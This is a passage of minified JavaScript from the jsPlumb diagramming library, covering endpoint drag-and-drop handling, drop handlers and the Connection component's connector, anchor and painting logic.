d=0,_=o.length;d<_;d++)i.deleteConnection(o[0]);return this},this.getElement=function(){return this.element},this.setElement=function(o){var r=this._jsPlumb.instance.getId(o),d=this.elementId;return e.removeWithFunction(n.endpointsByElement[this.elementId],function(n){return n.id===this.id}.bind(this)),this.element=t.getElement(o),this.elementId=i.getId(this.element),i.anchorManager.rehomeEndpoint(this,d,this.element),i.dragManager.endpointAdded(this.element),e.addToList(n.endpointsByElement,r,this),this},this.makeInPlaceCopy=function(){var t=this.anchor.getCurrentLocation({element:this}),e=this.anchor.getOrientation(this),o=this.anchor.getCssClass(),i={bind:function(){},compute:function(){return[t[0],t[1]]},getCurrentLocation:function(){return[t[0],t[1]]},getOrientation:function(){return e},getCssClass:function(){return o}};return _({dropOptions:n.dropOptions,anchor:i,source:this.element,paintStyle:this.getPaintStyle(),endpoint:n.hideOnDrag?"Blank":this.endpoint,_transient:!0,scope:this.scope,reference:this})},this.connectorSelector=function(){return this.connections[0]},this.setStyle=this.setPaintStyle,this.paint=function(n){var t=(n=n||{}).timestamp,e=!(!1===n.recalc);if(!t||this.timestamp!==t){var o=i.updateOffset({elId:this.elementId,timestamp:t}),r=n.offset?n.offset.o:o.o;if(null!=r){var d=n.anchorPoint,_=n.connectorPaintStyle;if(null==d){var s=n.dimensions||o.s,a={xy:[r.left,r.top],wh:s,element:this,timestamp:t};if(e&&this.anchor.isDynamic&&this.connections.length>0){var w=function(n,t){var e=0;if(null!=t)for(var o=0;o<n.connections.length;o++)if(n.connections[o].sourceId===t||n.connections[o].targetId===t){e=o;break}return n.connections[e]}(this,n.elementWithPrecedence),l=w.endpoints[0]===this?1:0,u=0===l?w.sourceId:w.targetId,c=i.getCachedData(u),B=c.o,h=c.s;a.index=0===l?1:0,a.connection=w,a.txy=[B.left,B.top],a.twh=h,a.tElement=w.endpoints[l]}else this.connections.length>0&&(a.connection=this.connections[0]);d=this.anchor.compute(a)}for(var j in this.endpoint.compute(d,this.anchor.getOrientation(this),this._jsPlumb.paintStyleInUse,_||this.paintStyleInUse),this.endpoint.paint(this._jsPlumb.paintStyleInUse,this.anchor),this.timestamp=t,this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(j)){var p=this._jsPlumb.overlays[j];p.isVisible()&&(this._jsPlumb.overlayPlacements[j]=p.draw(this.endpoint,this._jsPlumb.paintStyleInUse),p.paint(this._jsPlumb.overlayPlacements[j]))}}}},this.getTypeDescriptor=function(){return"endpoint"},this.isVisible=function(){return this._jsPlumb.visible},this.repaint=this.paint;var l=!1;this.initDraggable=function(){if(!l&&t.isDragSupported(this.element)){var o,s={id:null,element:null},a=null,w=!1,u=null,c=function(n,t,e){var o=!1;return{drag:function(){if(o)return o=!1,!0;if(t.element){var i=e.getUIPosition(arguments,e.getZoom());null!=i&&e.setPosition(t.element,i),e.repaint(t.element,i),n.paint({anchorPoint:n.anchor.getCurrentLocation({element:n})})}},stopDrag:function(){o=!0}}}(this,s,i),B=n.dragOptions||{},h=t.dragEvents.start,j=t.dragEvents.stop,p=t.dragEvents.drag,f=t.dragEvents.beforeStart,g=function(e){a=this.connectorSelector();var l=!0;this.isEnabled()||(l=!1),null!=a||this.isSource||this.isTemporarySource||(l=!1),!this.isSource||!this.isFull()||null!=a&&this.dragAllowedWhenFull||(l=!1),null==a||a.isDetachable(this)||(l=!1);var B=i.checkCondition(null==a?"beforeDrag":"beforeStartDetach",{endpoint:this,source:this.element,sourceId:this.elementId,connection:a});if(!1===B?l=!1:"object"==(void 0===B?"undefined":d()(B))?t.extend(B,o||{}):B=o||{},!1===l)return i.stopDrag&&i.stopDrag(this.canvas),c.stopDrag(),!1;for(var h=0;h<this.connections.length;h++)this.connections[h].setHover(!1);this.addClass("endpointDrag"),i.setConnectionBeingDragged(!0),a&&!this.isFull()&&this.isSource&&(a=null),i.updateOffset({elId:this.elementId});var j=this._jsPlumb.instance.getOffset(this.canvas),p=this.canvas,f=this._jsPlumb.instance.getSize(this.canvas);(function(n,t,e,o){var i=t.createElement("div",{position:"absolute"});t.appendElement(i);var r=t.getId(i);t.setPosition(i,e),i.style.width=o[0]+"px",i.style.height=o[1]+"px",t.manage(r,i,!0),n.id=r,n.element=i})(s,i,j,f),i.setAttributes(this.canvas,{dragId:s.id,elId:this.elementId});var g=this.dragProxy||this.endpoint;if(null==this.dragProxy&&null!=this.connectionType){var m=this._jsPlumb.instance.deriveEndpointAndAnchorSpec(this.connectionType);m.endpoints[1]&&(g=m.endpoints[1])}var v=this._jsPlumb.instance.makeAnchor("Center");v.isFloating=!0,this._jsPlumb.floatingEndpoint=function(n,e,o,i,r,d,_,s){return _({paintStyle:n,endpoint:o,anchor:new t.FloatingAnchor({reference:e,referenceCanvas:i,jsPlumbInstance:d}),source:r,scope:s})}(this.getPaintStyle(),v,g,this.canvas,s.element,i,_,this.scope);var C=this._jsPlumb.floatingEndpoint.anchor;if(null==a)this.setHover(!1,!1),(a=r({sourceEndpoint:this,targetEndpoint:this._jsPlumb.floatingEndpoint,source:this.element,target:s.element,anchors:[this.anchor,this._jsPlumb.floatingEndpoint.anchor],paintStyle:n.connectorStyle,hoverPaintStyle:n.connectorHoverStyle,connector:n.connector,overlays:n.connectorOverlays,type:this.connectionType,cssClass:this.connectorClass,hoverClass:this.connectorHoverClass,scope:n.scope,data:B})).pending=!0,a.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.anchor=C,i.fire("connectionDrag",a),i.anchorManager.newConnection(a);else{w=!0,a.setHover(!1);var b=a.endpoints[0].id===this.id?0:1;this.detachFromConnection(a,null,!0);var y=i.getDragScope(p);i.setAttribute(this.canvas,"originalScope",y),i.fire("connectionDrag",a),0===b?(u=[a.source,a.sourceId,p,y],i.anchorManager.sourceChanged(a.endpoints[b].elementId,s.id,a,s.element)):(u=[a.target,a.targetId,p,y],a.target=s.element,a.targetId=s.id,i.anchorManager.updateOtherEndpoint(a.sourceId,a.endpoints[b].elementId,a.targetId,a)),a.suspendedEndpoint=a.endpoints[b],a.suspendedElement=a.endpoints[b].getElement(),a.suspendedElementId=a.endpoints[b].elementId,a.suspendedElementType=0===b?"source":"target",a.suspendedEndpoint.setHover(!1),this._jsPlumb.floatingEndpoint.referenceEndpoint=a.suspendedEndpoint,a.endpoints[b]=this._jsPlumb.floatingEndpoint,a.addClass(i.draggingClass),this._jsPlumb.floatingEndpoint.addClass(i.draggingClass)}i.registerFloatingConnection(s,a,this._jsPlumb.floatingEndpoint),i.currentlyDragging=!0}.bind(this),m=function(){if(i.setConnectionBeingDragged(!1),a&&null!=a.endpoints){var n=i.getDropEvent(arguments),t=i.getFloatingAnchorIndex(a);if(a.endpoints[0===t?1:0].anchor.locked=!1,a.removeClass(i.draggingClass),this._jsPlumb&&(a.deleteConnectionNow||a.endpoints[t]===this._jsPlumb.floatingEndpoint)&&w&&a.suspendedEndpoint){0===t?(a.floatingElement=a.source,a.floatingId=a.sourceId,a.floatingEndpoint=a.endpoints[0],a.floatingIndex=0,a.source=u[0],a.sourceId=u[1]):(a.floatingElement=a.target,a.floatingId=a.targetId,a.floatingEndpoint=a.endpoints[1],a.floatingIndex=1,a.target=u[0],a.targetId=u[1]);var e=this._jsPlumb.floatingEndpoint;i.setDragScope(u[2],u[3]),a.endpoints[t]=a.suspendedEndpoint,a.isReattach()||a._forceReattach||a._forceDetach||!i.deleteConnection(a,{originalEvent:n})?(a.setHover(!1),a._forceDetach=null,a._forceReattach=null,this._jsPlumb.floatingEndpoint.detachFromConnection(a),a.suspendedEndpoint.addConnection(a),1===t?i.anchorManager.updateOtherEndpoint(a.sourceId,a.floatingId,a.targetId,a):i.anchorManager.sourceChanged(a.floatingId,a.sourceId,a,a.source),i.repaint(u[1])):i.deleteObject({endpoint:e})}this.deleteAfterDragStop?i.deleteObject({endpoint:this}):this._jsPlumb&&this.paint({recalc:!1}),i.fire("connectionDragStop",a,n),a.pending&&i.fire("connectionAborted",a,n),i.currentlyDragging=!1,a.suspendedElement=null,a.suspendedEndpoint=null,a=null}s&&s.element&&i.remove(s.element,!1,!1),this._jsPlumb&&(this.canvas.style.visibility="visible",this.anchor.locked=!1,this._jsPlumb.floatingEndpoint=null)}.bind(this);(B=t.extend({},B)).scope=this.scope||B.scope,B[f]=e.wrap(B[f],function(n){o=n.e.payload||{}},!1),B[h]=e.wrap(B[h],g,!1),B[p]=e.wrap(B[p],c.drag),B[j]=e.wrap(B[j],m),B.multipleDrop=!1,B.canDrag=function(){return this.isSource||this.isTemporarySource||this.connections.length>0}.bind(this),i.initDraggable(this.canvas,B,"internal"),this.canvas._jsPlumbRelatedElement=this.element,l=!0}};var u=n.endpoint||this._jsPlumb.instance.Defaults.Endpoint||t.Defaults.Endpoint;this.setEndpoint(u,!0);var c=n.anchor?n.anchor:n.anchors?n.anchors:i.Defaults.Anchor||"Top";this.setAnchor(c,!0);var B=["default",n.type||""].join(" ");this.addType(B,n.data,!0),this.canvas=this.endpoint.canvas,this.canvas._jsPlumb=this,this.initDraggable();var h=function(o,r,d,_){if(t.isDropSupported(this.element)){var s=n.dropOptions||i.Defaults.DropOptions||t.Defaults.DropOptions;(s=t.extend({},s)).scope=s.scope||this.scope;var a=t.dragEvents.drop,w=t.dragEvents.over,l=t.dragEvents.out,u=this,c=i.EndpointDropHandler({getEndpoint:function(){return u},jsPlumb:i,enabled:function(){return null==d||d.isEnabled()},isFull:function(){return d.isFull()},element:this.element,elementId:this.elementId,isSource:this.isSource,isTarget:this.isTarget,addClass:function(n){u.addClass(n)},removeClass:function(n){u.removeClass(n)},isDropAllowed:function(){return u.isDropAllowed.apply(u,arguments)},reference:_,isRedrop:function(n,t){return n.suspendedEndpoint&&t.reference&&n.suspendedEndpoint.id===t.reference.id}});s[a]=e.wrap(s[a],c,!0),s[w]=e.wrap(s[w],function(){var n=t.getDragObject(arguments),e=i.getAttribute(t.getElement(n),"dragId"),o=i.getFloatingConnectionFor(e);if(null!=o){var r=i.getFloatingAnchorIndex(o);if(this.isTarget&&0!==r||o.suspendedEndpoint&&this.referenceEndpoint&&this.referenceEndpoint.id===o.suspendedEndpoint.id){var d=i.checkCondition("checkDropAllowed",{sourceEndpoint:o.endpoints[r],targetEndpoint:this,connection:o});this[(d?"add":"remove")+"Class"](i.endpointDropAllowedClass),this[(d?"remove":"add")+"Class"](i.endpointDropForbiddenClass),o.endpoints[r].anchor.over(this.anchor,this)}}}.bind(this)),s[l]=e.wrap(s[l],function(){var n=t.getDragObject(arguments),e=null==n?null:i.getAttribute(t.getElement(n),"dragId"),o=e?i.getFloatingConnectionFor(e):null;if(null!=o){var r=i.getFloatingAnchorIndex(o);(this.isTarget&&0!==r||o.suspendedEndpoint&&this.referenceEndpoint&&this.referenceEndpoint.id===o.suspendedEndpoint.id)&&(this.removeClass(i.endpointDropAllowedClass),this.removeClass(i.endpointDropForbiddenClass),o.endpoints[r].anchor.out())}}.bind(this)),i.initDroppable(o,s,"internal",r)}}.bind(this);return this.anchor.isFloating||h(this.canvas,!(n._transient||this.anchor.isFloating),this,n.reference),this},e.extend(t.Endpoint,t.OverlayCapableJsPlumbUIComponent,{setVisible:function(n,t,e){if(this._jsPlumb.visible=n,this.canvas&&(this.canvas.style.display=n?"block":"none"),this[n?"showOverlays":"hideOverlays"](),!t)for(var o=0;o<this.connections.length;o++)if(this.connections[o].setVisible(n),!e){var i=this===this.connections[o].endpoints[0]?1:0;1===this.connections[o].endpoints[i].connections.length&&this.connections[o].endpoints[i].setVisible(n,!0,!0)}},getAttachedElements:function(){return this.connections},applyType:function(n,e){this.setPaintStyle(n.endpointStyle||n.paintStyle,e),this.setHoverPaintStyle(n.endpointHoverStyle||n.hoverPaintStyle,e),null!=n.maxConnections&&(this._jsPlumb.maxConnections=n.maxConnections),n.scope&&(this.scope=n.scope),t.extend(this,n,o),null!=n.cssClass&&this.canvas&&this._jsPlumb.instance.addClass(this.canvas,n.cssClass),t.OverlayCapableJsPlumbUIComponent.applyType(this,n)},isEnabled:function(){return this._jsPlumb.enabled},setEnabled:function(n){this._jsPlumb.enabled=n},cleanup:function(){var n=this._jsPlumb.instance.endpointAnchorClassPrefix+(this._jsPlumb.currentAnchorClass?"-"+this._jsPlumb.currentAnchorClass:"");t.removeClass(this.element,n),this.anchor=null,this.endpoint.cleanup(!0),this.endpoint.destroy(),this.endpoint=null,this._jsPlumb.instance.destroyDraggable(this.canvas,"internal"),this._jsPlumb.instance.destroyDroppable(this.canvas,"internal")},setHover:function(n){this.endpoint&&this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged()&&this.endpoint.setHover(n)},isFull:function(){return 0===this._jsPlumb.maxConnections||!(this.isFloating()||this._jsPlumb.maxConnections<0||this.connections.length<this._jsPlumb.maxConnections)},isFloating:function(){return null!=this.anchor&&this.anchor.isFloating},isConnectedTo:function(n){var t=!1;if(n)for(var e=0;e<this.connections.length;e++)if(this.connections[e].endpoints[1]===n||this.connections[e].endpoints[0]===n){t=!0;break}return t},getConnectionCost:function(){return this._jsPlumb.connectionCost},setConnectionCost:function(n){this._jsPlumb.connectionCost=n},areConnectionsDirected:function(){return this._jsPlumb.connectionsDirected},setConnectionsDirected:function(n){this._jsPlumb.connectionsDirected=n},setElementId:function(n){this.elementId=n,this.anchor.elementId=n},setReferenceElement:function(n){this.element=t.getElement(n)},setDragAllowedWhenFull:function(n){this.dragAllowedWhenFull=n},equals:function(n){return this.anchor.equals(n.anchor)},getUuid:function(){return this._jsPlumb.uuid},computeAnchor:function(n){return this.anchor.compute(n)}}),n.jsPlumbInstance.prototype.EndpointDropHandler=function(n){return function(t){var o=n.jsPlumb;n.removeClass(o.endpointDropAllowedClass),n.removeClass(o.endpointDropForbiddenClass);var i=o.getDropEvent(arguments),r=o.getDragObject(arguments),d=o.getAttribute(r,"dragId"),_=(o.getAttribute(r,"elId"),o.getAttribute(r,"originalScope")),s=o.getFloatingConnectionFor(d);if(null!=s){var a=null!=s.suspendedEndpoint;if(!a||null!=s.suspendedEndpoint._jsPlumb){var w=n.getEndpoint(s);if(null!=w){if(n.isRedrop(s,n))return s._forceReattach=!0,s.setHover(!1),void(n.maybeCleanup&&n.maybeCleanup(w));var l=o.getFloatingAnchorIndex(s);if(0===l&&!n.isSource||1===l&&!n.isTarget)return void(n.maybeCleanup&&n.maybeCleanup(w));n.onDrop&&n.onDrop(s),_&&o.setDragScope(r,_);var u=n.isFull(t);if(u&&w.fire("maxConnections",{endpoint:this,connection:s,maxConnections:w._jsPlumb.maxConnections},i),!u&&n.enabled()){var c=!0;0===l?(s.floatingElement=s.source,s.floatingId=s.sourceId,s.floatingEndpoint=s.endpoints[0],s.floatingIndex=0,s.source=n.element,s.sourceId=n.elementId):(s.floatingElement=s.target,s.floatingId=s.targetId,s.floatingEndpoint=s.endpoints[1],s.floatingIndex=1,s.target=n.element,s.targetId=n.elementId),a&&s.suspendedEndpoint.id!==w.id&&(s.isDetachAllowed(s)&&s.endpoints[l].isDetachAllowed(s)&&s.suspendedEndpoint.isDetachAllowed(s)&&o.checkCondition("beforeDetach",s)||(c=!1));var B=function(t){s.endpoints[l].detachFromConnection(s),s.suspendedEndpoint&&s.suspendedEndpoint.detachFromConnection(s),s.endpoints[l]=w,w.addConnection(s);var r=w.getParameters();for(var d in r)s.setParameter(d,r[d]);if(a){var _=s.suspendedEndpoint.elementId;o.fireMoveEvent({index:l,originalSourceId:0===l?_:s.sourceId,newSourceId:0===l?w.elementId:s.sourceId,originalTargetId:1===l?_:s.targetId,newTargetId:1===l?w.elementId:s.targetId,originalSourceEndpoint:0===l?s.suspendedEndpoint:s.endpoints[0],newSourceEndpoint:0===l?w:s.endpoints[0],originalTargetEndpoint:1===l?s.suspendedEndpoint:s.endpoints[1],newTargetEndpoint:1===l?w:s.endpoints[1],connection:s},i)}else r.draggable&&o.initDraggable(this.element,n.dragOptions,"internal",o);1===l?o.anchorManager.updateOtherEndpoint(s.sourceId,s.floatingId,s.targetId,s):o.anchorManager.sourceChanged(s.floatingId,s.sourceId,s,s.source),s.endpoints[0].finalEndpoint&&(s.endpoints[0].detachFromConnection(s),s.endpoints[0]=s.endpoints[0].finalEndpoint,s.endpoints[0].addConnection(s)),e.isObject(t)&&s.mergeData(t),o.finaliseConnection(s,null,i,!1),s.setHover(!1)}.bind(this);if(c=c&&n.isDropAllowed(s.sourceId,s.targetId,s.scope,s,w))return B(c),!0;s.suspendedEndpoint&&(s.endpoints[l]=s.suspendedEndpoint,s.setHover(!1),s._forceDetach=!0,0===l?(s.source=s.suspendedEndpoint.element,s.sourceId=s.suspendedEndpoint.elementId):(s.target=s.suspendedEndpoint.element,s.targetId=s.suspendedEndpoint.elementId),s.suspendedEndpoint.addConnection(s),1===l?o.anchorManager.updateOtherEndpoint(s.sourceId,s.floatingId,s.targetId,s):o.anchorManager.sourceChanged(s.floatingId,s.sourceId,s,s.source),o.repaint(s.sourceId),s._forceDetach=!1)}n.maybeCleanup&&n.maybeCleanup(w),o.currentlyDragging=!1}}}}}}.call("undefined"!=typeof window?window:this),function(){var n=this,t=n.jsPlumb,e=n.jsPlumbUtil,o=function(n,e,o,i,r){if(!n.Defaults.DoNotThrowErrors&&null==t.Connectors[e][o])throw{msg:"jsPlumb: unknown connector type '"+o+"'"};return new t.Connectors[e][o](i,r)},i=function(n,t,e){return n?e.makeAnchor(n,t,e):null},r=function(n,t,o,i){null!=t&&(t._jsPlumbConnections=t._jsPlumbConnections||{},i?delete t._jsPlumbConnections[n.id]:t._jsPlumbConnections[n.id]=!0,e.isEmpty(t._jsPlumbConnections)?o.removeClass(t,o.connectedClass):o.addClass(t,o.connectedClass))};t.Connection=function(n){var o=n.newEndpoint;this.id=n.id,this.connector=null,this.idPrefix="_jsplumb_c_",this.defaultLabelLocation=.5,this.defaultOverlayKeys=["Overlays","ConnectionOverlays"],this.previousConnection=n.previousConnection,this.source=t.getElement(n.source),this.target=t.getElement(n.target),n.sourceEndpoint&&(this.source=n.sourceEndpoint.getElement()),n.targetEndpoint&&(this.target=n.targetEndpoint.getElement()),t.OverlayCapableJsPlumbUIComponent.apply(this,arguments),this.sourceId=this._jsPlumb.instance.getId(this.source),this.targetId=this._jsPlumb.instance.getId(this.target),this.scope=n.scope,this.endpoints=[],this.endpointStyles=[];var i=this._jsPlumb.instance;i.manage(this.sourceId,this.source),i.manage(this.targetId,this.target),this._jsPlumb.visible=!0,this._jsPlumb.editable=!0===n.editable,this._jsPlumb.params={cssClass:n.cssClass,container:n.container,"pointer-events":n["pointer-events"],editorParams:n.editorParams,overlays:n.overlays},this._jsPlumb.lastPaintedAt=null,this.bind("mouseover",function(){this.setHover(!0)}.bind(this)),this.bind("mouseout",function(){this.setHover(!1)}.bind(this)),this.editableRequested=!1!==n.editable,this.setEditable=function(n){return!!this.connector&&this.connector.setEditable(n)},this.isEditable=function(){return!!this.connector&&this.connector.isEditable()},this.isEditing=function(){return!!this.connector&&this.connector.isEditing()},this.makeEndpoint=function(t,e,r,d){return r=r||this._jsPlumb.instance.getId(e),this.prepareEndpoint(i,o,this,d,t?0:1,n,e,r)},n.type&&(n.endpoints=n.endpoints||this._jsPlumb.instance.deriveEndpointAndAnchorSpec(n.type).endpoints);var r=this.makeEndpoint(!0,this.source,this.sourceId,n.sourceEndpoint),d=this.makeEndpoint(!1,this.target,this.targetId,n.targetEndpoint);r&&e.addToList(n.endpointsByElement,this.sourceId,r),d&&e.addToList(n.endpointsByElement,this.targetId,d),this.scope||(this.scope=this.endpoints[0].scope),null!=n.deleteEndpointsOnEmpty&&(this.endpoints[0].setDeleteOnEmpty(n.deleteEndpointsOnEmpty),this.endpoints[1].setDeleteOnEmpty(n.deleteEndpointsOnEmpty));var _=i.Defaults.ConnectionsDetachable;!1===n.detachable&&(_=!1),!1===this.endpoints[0].connectionsDetachable&&(_=!1),!1===this.endpoints[1].connectionsDetachable&&(_=!1);var s=n.reattach||this.endpoints[0].reattachConnections||this.endpoints[1].reattachConnections||i.Defaults.ReattachConnections;this.appendToDefaultType({detachable:_,reattach:s,paintStyle:this.endpoints[0].connectorStyle||this.endpoints[1].connectorStyle||n.paintStyle||i.Defaults.PaintStyle||t.Defaults.PaintStyle,hoverPaintStyle:this.endpoints[0].connectorHoverStyle||this.endpoints[1].connectorHoverStyle||n.hoverPaintStyle||i.Defaults.HoverPaintStyle||t.Defaults.HoverPaintStyle});var a=i.getSuspendedAt();if(!i.isSuspendDrawing()){var w=i.getCachedData(this.sourceId),l=w.o,u=w.s,c=i.getCachedData(this.targetId),B=c.o,h=c.s,j=a||i.timestamp(),p=this.endpoints[0].anchor.compute({xy:[l.left,l.top],wh:u,element:this.endpoints[0],elementId:this.endpoints[0].elementId,txy:[B.left,B.top],twh:h,tElement:this.endpoints[1],timestamp:j});this.endpoints[0].paint({anchorLoc:p,timestamp:j}),p=this.endpoints[1].anchor.compute({xy:[B.left,B.top],wh:h,element:this.endpoints[1],elementId:this.endpoints[1].elementId,txy:[l.left,l.top],twh:u,tElement:this.endpoints[0],timestamp:j}),this.endpoints[1].paint({anchorLoc:p,timestamp:j})}this.getTypeDescriptor=function(){return"connection"},this.getAttachedElements=function(){return this.endpoints},this.isDetachable=function(){return!0===this._jsPlumb.detachable},this.setDetachable=function(n){this._jsPlumb.detachable=!0===n},this.isReattach=function(){return!0===this._jsPlumb.reattach||!0===this.endpoints[0].reattachConnections||!0===this.endpoints[1].reattachConnections},this.setReattach=function(n){this._jsPlumb.reattach=!0===n},this._jsPlumb.cost=n.cost||this.endpoints[0].getConnectionCost(),this._jsPlumb.directed=n.directed,null==n.directed&&(this._jsPlumb.directed=this.endpoints[0].areConnectionsDirected());var f=t.extend({},this.endpoints[1].getParameters());t.extend(f,this.endpoints[0].getParameters()),t.extend(f,this.getParameters()),this.setParameters(f),this.setConnector(this.endpoints[0].connector||this.endpoints[1].connector||n.connector||i.Defaults.Connector||t.Defaults.Connector,!0),n.geometry&&this.connector.setGeometry(n.geometry);var g=null!=n.data&&e.isObject(n.data)?n.data:{};this.getData=function(){return g},this.setData=function(n){g=n||{}},this.mergeData=function(n){g=t.extend(g,n)};var m=["default",this.endpoints[0].connectionType,this.endpoints[1].connectionType,n.type].join(" ");/[^\s]/.test(m)&&this.addType(m,n.data,!0),this.updateConnectedClass()},e.extend(t.Connection,t.OverlayCapableJsPlumbUIComponent,{applyType:function(n,e,o){var i=null;null!=n.connector&&(null==(i=this.getCachedTypeItem("connector",o.connector))&&(i=this.prepareConnector(n.connector,o.connector),this.cacheTypeItem("connector",i,o.connector)),this.setPreparedConnector(i)),null!=n.detachable&&this.setDetachable(n.detachable),null!=n.reattach&&this.setReattach(n.reattach),n.scope&&(this.scope=n.scope),null!=n.cssClass&&this.canvas&&this._jsPlumb.instance.addClass(this.canvas,n.cssClass);var r=null;n.anchor?null==(r=this.getCachedTypeItem("anchors",o.anchor))&&(r=[this._jsPlumb.instance.makeAnchor(n.anchor),this._jsPlumb.instance.makeAnchor(n.anchor)],this.cacheTypeItem("anchors",r,o.anchor)):n.anchors&&null==(r=this.getCachedTypeItem("anchors",o.anchors))&&(r=[this._jsPlumb.instance.makeAnchor(n.anchors[0]),this._jsPlumb.instance.makeAnchor(n.anchors[1])],this.cacheTypeItem("anchors",r,o.anchors)),null!=r&&(this.endpoints[0].anchor=r[0],this.endpoints[1].anchor=r[1],this.endpoints[1].anchor.isDynamic&&this._jsPlumb.instance.repaint(this.endpoints[1].elementId)),t.OverlayCapableJsPlumbUIComponent.applyType(this,n)},addClass:function(n,t){t&&(this.endpoints[0].addClass(n),this.endpoints[1].addClass(n),this.suspendedEndpoint&&this.suspendedEndpoint.addClass(n)),this.connector&&this.connector.addClass(n)},removeClass:function(n,t){t&&(this.endpoints[0].removeClass(n),this.endpoints[1].removeClass(n),this.suspendedEndpoint&&this.suspendedEndpoint.removeClass(n)),this.connector&&this.connector.removeClass(n)},isVisible:function(){return this._jsPlumb.visible},setVisible:function(n){this._jsPlumb.visible=n,this.connector&&this.connector.setVisible(n),this.repaint()},cleanup:function(){this.updateConnectedClass(!0),this.endpoints=null,this.source=null,this.target=null,null!=this.connector&&(this.connector.cleanup(!0),this.connector.destroy(!0)),this.connector=null},updateConnectedClass:function(n){this._jsPlumb&&(r(this,this.source,this._jsPlumb.instance,n),r(this,this.target,this._jsPlumb.instance,n))},setHover:function(t){this.connector&&this._jsPlumb&&!this._jsPlumb.instance.isConnectionBeingDragged()&&(this.connector.setHover(t),n.jsPlumb[t?"addClass":"removeClass"](this.source,this._jsPlumb.instance.hoverSourceClass),n.jsPlumb[t?"addClass":"removeClass"](this.target,this._jsPlumb.instance.hoverTargetClass))},getUuids:function(){return[this.endpoints[0].getUuid(),this.endpoints[1].getUuid()]},getCost:function(){return this._jsPlumb?this._jsPlumb.cost:-1/0},setCost:function(n){this._jsPlumb.cost=n},isDirected:function(){return this._jsPlumb.directed},getConnector:function(){return this.connector},getGeometry:function(){return this.connector?this.connector.getGeometry():null},setGeometry:function(n){this.connector&&this.connector.setGeometry(n)},prepareConnector:function(n,t){var i,r={_jsPlumb:this._jsPlumb.instance,cssClass:(this._jsPlumb.params.cssClass||"")+(this.isEditable()?this._jsPlumb.instance.editableConnectorClass:""),container:this._jsPlumb.params.container,"pointer-events":this._jsPlumb.params["pointer-events"],editable:this.editableRequested},d=this._jsPlumb.instance.getRenderMode();return e.isString(n)?i=o(this._jsPlumb.instance,d,n,r,this):e.isArray(n)&&(i=1===n.length?o(this._jsPlumb.instance,d,n[0],r,this):o(this._jsPlumb.instance,d,n[0],e.merge(n[1],r),this)),null!=t&&(i.typeId=t),i},setPreparedConnector:function(n,t,e,o){if(this.connector!==n){var i,r="";if(null!=this.connector&&(r=(i=this.connector).getClass(),this.connector.cleanup(),this.connector.destroy()),this.connector=n,o&&this.cacheTypeItem("connector",n,o),this.canvas=this.connector.canvas,this.bgCanvas=this.connector.bgCanvas,this.addClass(r),this.canvas&&(this.canvas._jsPlumb=this),this.bgCanvas&&(this.bgCanvas._jsPlumb=this),null!=i)for(var d=this.getOverlays(),_=0;_<d.length;_++)d[_].transfer&&d[_].transfer(this.connector);e||this.setListenerComponent(this.connector),t||this.repaint()}},setConnector:function(n,t,e,o){var i=this.prepareConnector(n,o);this.setPreparedConnector(i,t,e,o)},paint:function(n){if(!this._jsPlumb.instance.isSuspendDrawing()&&this._jsPlumb.visible){var t=(n=n||{}).timestamp,e=this.targetId,o=this.sourceId;if(null==t||t!==this._jsPlumb.lastPaintedAt){var i=this._jsPlumb.instance.updateOffset({elId:o}).o,r=this._jsPlumb.instance.updateOffset({elId:e}).o,d=this.endpoints[0],_=this.endpoints[1],s=d.anchor.getCurrentLocation({xy:[i.left,i.top],wh:[i.width,i.height],element:d,timestamp:t}),a=_.anchor.getCurrentLocation({xy:[r.left,r.top],wh:[r.width,r.height],element:_,timestamp:t});this.connector.resetBounds(),this.connector.compute({sourcePos:s,targetPos:a,sourceEndpoint:this.endpoints[0],targetEndpoint:this.endpoints[1],"stroke-width":this._jsPlumb.paintStyleInUse.strokeWidth,sourceInfo:i,targetInfo:r});var w={minX:1/0,minY:1/0,maxX:-1/0,maxY:-1/0};for(var l in this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(l)){var u=this._jsPlumb.overlays[l];u.isVisible()&&(this._jsPlumb.overlayPlacements[l]=u.draw(this.connector,this._jsPlumb.paintStyleInUse,this.getAbsoluteOverlayPosition(u)),w.minX=Math.min(w.minX,this._jsPlumb.overlayPlacements[l].minX),w.maxX=Math.max(w.maxX,this._jsPlumb.overlayPlacements[l].maxX),w.minY=Math.min(w.minY,this._jsPlumb.overlayPlacements[l].minY),w.maxY=Math.max(w.maxY,this._jsPlumb.overlayPlacements[l].maxY))}var c=parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth||1)/2,B=parseFloat(this._jsPlumb.paintStyleInUse.strokeWidth||0),h={xmin:Math.min(this.connector.bounds.minX-(c+B),w.minX),ymin:Math.min(this.connector.bounds.minY-(c+B),w.minY),xmax:Math.max(this.connector.bounds.maxX+(c+B),w.maxX),ymax:Math.max(this.connector.bounds.maxY+(c+B),w.maxY)};for(var j in this.connector.paint(this._jsPlumb.paintStyleInUse,null,h),this._jsPlumb.overlays)if(this._jsPlumb.overlays.hasOwnProperty(j)){var p=this._jsPlumb.overlays[j];p.isVisible()&&p.paint(this._jsPlumb.overlayPlacements[j],h)}}this._jsPlumb.lastPaintedAt=t}},repaint:function(n){n=n||{},this.paint({elId:this.sourceId,recalc:!(!1===n.recalc),timestamp:n.timestamp})},prepareEndpoint:function(n,e,o,r,d,_,s,a){var w;if(r)o.endpoints[d]=r,r.addConnection(o);else{_.endpoints||(_.endpoints=[null,null]);var l=_.endpoints[d]||_.endpoint||n.Defaults.Endpoints[d]||t.Defaults.Endpoints[d]||n.Defaults.Endpoint||t.Defaults.Endpoint;_.endpointStyles||(_.endpointStyles=[null,null]),_.endpointHoverStyles||(_.endpointHoverStyles=[null,null]);var u=_.endpointStyles[d]||_.endpointStyle||n.Defaults.EndpointStyles[d]||t.Defaults.EndpointStyles[d]||n.Defaults.EndpointStyle||t.Defaults.EndpointStyle;null==u.fill&&null!=_.paintStyle&&(u.fill=_.paintStyle.stroke),null==u.outlineStroke&&null!=_.paintStyle&&(u.outlineStroke=_.paintStyle.outlineStroke),null==u.outlineWidth&&null!=_.paintStyle&&(u.outlineWidth=_.paintStyle.outlineWidth);var 